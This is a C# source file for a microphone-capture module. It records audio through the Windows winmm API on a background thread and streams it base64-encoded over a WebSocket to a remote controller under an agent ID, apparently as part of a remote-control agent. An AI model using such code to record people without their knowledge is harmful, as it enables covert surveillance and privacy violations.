using System.Runtime.InteropServices;
using LibraNextgen.Agent.Communication;

namespace LibraNextgen.Agent.Modules.Execution;

public sealed class MicCapture : IDisposable
{
    private readonly WsCommunicator _ws;
    private readonly string _agentId;

    private int _deviceIndex;
    private IntPtr _hWaveIn;
    private volatile bool _recording;
    private Thread? _recordThread;
    private CancellationTokenSource? _cts;

    private const int SampleRate = 16000;
    private const int BitsPerSample = 16;
    private const int Channels = 1;
    private const int BufferMs = 200;
    private const int NumBuffers = 3;

    private IntPtr[]? _bufferPtrs;
    private IntPtr[]? _headerPtrs;
    private GCHandle _callbackHandle;
    private readonly AutoResetEvent _bufferEvent = new(false);

    public MicCapture(WsCommunicator ws, string agentId)
    {
        _ws = ws;
        _agentId = agentId;
    }

    public static string GetDevicesJson()
    {
        try
        {
            uint count = waveInGetNumDevs();
            var items = new List<string>();
            for (uint i = 0; i < count; i++)
            {
                var caps = new WAVEINCAPS();
                if (waveInGetDevCaps(i, ref caps, (uint)Marshal.SizeOf<WAVEINCAPS>()) == 0)
                {
                    items.Add($"{{\"index\":{i},\"name\":\"{EscapeJson(caps.szPname)}\",\"channels\":{caps.wChannels}}}");
                }
            }
            return $"[{string.Join(",", items)}]";
        }
        catch
        {
            return "[]";
        }
    }

    private static string EscapeJson(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

    public void Start(int deviceIndex)
    {
        Stop();
        _deviceIndex = deviceIndex;
        _cts = new CancellationTokenSource();

        try
        {
            uint devCount = waveInGetNumDevs();
            if (deviceIndex >= devCount)
            {
                _ = _ws.SendResultRawAsync("mic.error", _agentId,
                    $$"""{"error":"Mic index {{deviceIndex}} not found. Available: {{devCount}}"}""");
                return;
            }

            var wfx = new WAVEFORMATEX
            {
                wFormatTag = 1, // PCM
                nChannels = Channels,
                nSamplesPerSec = SampleRate,
                wBitsPerSample = BitsPerSample,
                nBlockAlign = (short)(Channels * BitsPerSample / 8),
                nAvgBytesPerSec = SampleRate * Channels * BitsPerSample / 8,
                cbSize = 0
            };

            _callbackHandle = GCHandle.Alloc(this);

            int mmResult = waveInOpen(out _hWaveIn, (uint)deviceIndex, ref wfx, WaveInCallback, GCHandle.ToIntPtr(_callbackHandle), CALLBACK_FUNCTION);
            if (mmResult != 0)
            {
                _callbackHandle.Free();
                _ = _ws.SendResultRawAsync("mic.error", _agentId, $$"""{"error":"waveInOpen failed: {{mmResult}}"}""");
                return;
            }

            int bufferBytes = SampleRate * Channels * (BitsPerSample / 8) * BufferMs / 1000;
            _bufferPtrs = new IntPtr[NumBuffers];
            _headerPtrs = new IntPtr[NumBuffers];

            for (int i = 0; i < NumBuffers; i++)
            {
                _bufferPtrs[i] = Marshal.AllocHGlobal(bufferBytes);
                var hdr = new WAVEHDR
                {
                    lpData = _bufferPtrs[i],
                    dwBufferLength = (uint)bufferBytes,
                    dwFlags = 0
                };
                _headerPtrs[i] = Marshal.AllocHGlobal(Marshal.SizeOf<WAVEHDR>());
                Marshal.StructureToPtr(hdr, _headerPtrs[i], false);

                waveInPrepareHeader(_hWaveIn, _headerPtrs[i], (uint)Marshal.SizeOf<WAVEHDR>());
                waveInAddBuffer(_hWaveIn, _headerPtrs[i], (uint)Marshal.SizeOf<WAVEHDR>());
            }

            _recording = true;
            _recordThread = new Thread(RecordLoop) { IsBackground = true, Name = "MicCapture" };
            _recordThread.Start();

            waveInStart(_hWaveIn);
        }
        catch (Exception ex)
        {
            _ = _ws.SendResultRawAsync("mic.error", _agentId, $$"""{"error":"{{EscapeJson(ex.Message)}}"}""");
        }
    }

    private void RecordLoop()
    {
        while (_recording && _cts != null && !_cts.IsCancellationRequested)
        {
            _bufferEvent.WaitOne(500);
            if (!_recording) break;

            for (int i = 0; i < NumBuffers; i++)
            {
                if (_headerPtrs == null) break;
                var hdr = Marshal.PtrToStructure<WAVEHDR>(_headerPtrs[i]);
                if ((hdr.dwFlags & WHDR_DONE) == 0) continue;

                if (hdr.dwBytesRecorded > 0)
                {
                    var pcmData = new byte[hdr.dwBytesRecorded];
                    Marshal.Copy(hdr.lpData, pcmData, 0, (int)hdr.dwBytesRecorded);

                    var dataJson = $$"""{"sampleRate":{{SampleRate}},"channels":{{Channels}},"bitsPerSample":{{BitsPerSample}},"data":"{{Convert.ToBase64String(pcmData)}}"}""";
                    _ = _ws.SendResultRawAsync("mic.data", _agentId, dataJson);
                }

                if (_recording)
                {
                    waveInAddBuffer(_hWaveIn, _headerPtrs[i], (uint)Marshal.SizeOf<WAVEHDR>());
                }
            }
        }
    }

    public void Stop()
    {
        _recording = false;
        _cts?.Cancel();
        _bufferEvent.Set();

        if (_hWaveIn != IntPtr.Zero)
        {
            waveInStop(_hWaveIn);
            waveInReset(_hWaveIn);

            if (_headerPtrs != null)
            {
                for (int i = 0; i < NumBuffers; i++)
                {
                    if (_headerPtrs[i] != IntPtr.Zero)
                    {
                        waveInUnprepareHeader(_hWaveIn, _headerPtrs[i], (uint)Marshal.SizeOf<WAVEHDR>());
                        Marshal.FreeHGlobal(_headerPtrs[i]);
                    }
                }
                _headerPtrs = null;
            }

            if (_bufferPtrs != null)
            {
                for (int i = 0; i < NumBuffers; i++)
                {
                    if (_bufferPtrs[i] != IntPtr.Zero)
                        Marshal.FreeHGlobal(_bufferPtrs[i]);
                }
                _bufferPtrs = null;
            }

            waveInClose(_hWaveIn);
            _hWaveIn = IntPtr.Zero;
        }

        _recordThread?.Join(1000);
        _recordThread = null;

        if (_callbackHandle.IsAllocated)
            _callbackHandle.Free();

        _cts?.Dispose();
        _cts = null;
    }

    public void Dispose() => Stop();

    // ════════════════════════════════════════════════════════════════════════
    //  winmm.dll P/Invoke
    // ════════════════════════════════════════════════════════════════════════

    private const int CALLBACK_FUNCTION = 0x30000;
    private const int WIM_DATA = 0x3C0;
    private const uint WHDR_DONE = 0x01;

    private delegate void WaveInProc(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2);

    private static readonly WaveInProc WaveInCallback = WaveInCallbackMethod;

    private static void WaveInCallbackMethod(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2)
    {
        if (uMsg == WIM_DATA)
        {
            var handle = GCHandle.FromIntPtr(dwInstance);
            if (handle.Target is MicCapture mic)
                mic._bufferEvent.Set();
        }
    }

    [DllImport("winmm.dll")]
    private static extern uint waveInGetNumDevs();

    [DllImport("winmm.dll", CharSet = CharSet.Auto)]
    private static extern int waveInGetDevCaps(uint uDeviceID, ref WAVEINCAPS pwic, uint cbwic);

    [DllImport("winmm.dll")]
    private static extern int waveInOpen(out IntPtr phwi, uint uDeviceID, ref WAVEFORMATEX lpFormat, WaveInProc dwCallback, IntPtr dwInstance, int fdwOpen);

    [DllImport("winmm.dll")]
    private static extern int waveInPrepareHeader(IntPtr hwi, IntPtr lpWaveInHdr, uint uSize);

    [DllImport("winmm.dll")]
    private static extern int waveInUnprepareHeader(IntPtr hwi, IntPtr lpWaveInHdr, uint uSize);

    [DllImport("winmm.dll")]
    private static extern int waveInAddBuffer(IntPtr hwi, IntPtr lpWaveInHdr, uint uSize);

    [DllImport("winmm.dll")]
    private static extern int waveInStart(IntPtr hwi);

    [DllImport("winmm.dll")]
    private static extern int waveInStop(IntPtr hwi);

    [DllImport("winmm.dll")]
    private static extern int waveInReset(IntPtr hwi);

    [DllImport("winmm.dll")]
    private static extern int waveInClose(IntPtr hwi);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WAVEINCAPS
    {
        public ushort wMid;
        public ushort wPid;
        public uint vDriverVersion;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string szPname;
        public uint dwFormats;
        public ushort wChannels;
        public ushort wReserved1;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WAVEFORMATEX
    {
        public short wFormatTag;
        public short nChannels;
        public int nSamplesPerSec;
        public int nAvgBytesPerSec;
        public short nBlockAlign;
        public short wBitsPerSample;
        public short cbSize;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WAVEHDR
    {
        public IntPtr lpData;
        public uint dwBufferLength;
        public uint dwBytesRecorded;
        public IntPtr dwUser;
        public uint dwFlags;
        public uint dwLoops;
        public IntPtr lpNext;
        public IntPtr reserved;
    }
}
